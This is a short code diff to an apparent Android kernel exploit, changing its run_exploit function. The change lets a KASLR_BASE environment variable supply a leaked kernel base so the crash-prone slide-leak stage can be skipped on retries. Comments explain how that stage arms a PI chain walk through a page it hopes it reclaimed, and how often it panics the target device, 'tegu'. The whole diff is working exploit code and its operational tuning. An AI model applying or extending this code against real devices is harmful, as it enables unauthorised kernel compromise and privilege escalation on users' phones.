@@ -263,7 +263,30 @@ int run_exploit(int argc, char **argv) {
   init_ashmem_path();
 
   pin_to_core(CORE);
-  if (!slide_leak_kernel_base()) {
+  // KASLR_BASE=0x... skips the slide and takes the kernel base as given.
+  //
+  // The slide is the only stage that panics: it arms a PI chain walk through a
+  // page it can only hope it reclaimed, and when it loses that race the kernel
+  // dereferences whatever else is there. On tegu it loses most of the time —
+  // nine consecutive runs at one point — and every loss is a reboot. The main
+  // route past it does not panic at all; it has failed over a hundred times in
+  // a row without taking the device down once.
+  //
+  // The base is fixed for the lifetime of a boot, so one successful slide is
+  // enough for every later run while the device stays up. A caller that has
+  // seen slide-kaslr-ok can hand the base back here, which is what the app
+  // does across its retries so that only the first attempt risks the slide.
+  // Unset by default, so a normal run derives the base the usual way, and a
+  // wrong value simply fails downstream rather than doing anything dangerous.
+  const char *kaslr_env = getenv("KASLR_BASE");
+  if (kaslr_env && *kaslr_env) {
+    kaslr_base = strtoull(kaslr_env, NULL, 0);
+    kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
+    kaslr_done = 1;
+    pr_success("kaslr supplied pid=%d base=%016llx slide=%016llx (slide route skipped)\n",
+               getpid(), (unsigned long long)kaslr_base,
+               (unsigned long long)kaslr_slide);
+  } else if (!slide_leak_kernel_base()) {
     pr_error("slide kaslr leak failed\n");
     return 1;
   }
